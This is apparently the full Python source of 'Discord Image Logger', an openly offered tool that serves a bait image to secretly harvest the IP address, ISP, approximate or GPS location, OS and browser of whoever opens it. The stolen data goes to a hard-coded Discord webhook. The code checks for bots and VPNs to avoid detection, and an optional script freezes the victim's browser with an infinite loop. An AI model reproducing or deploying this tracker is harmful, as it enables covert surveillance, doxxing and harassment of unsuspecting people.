# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1112476261051269280/bfIIyVp0rBVSA5qdHG6kjo3s6066etIVgus4AxVhYFKtYncPsjFskMQueZiqHeF1Kwvi",
    "image": "data:image/png;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
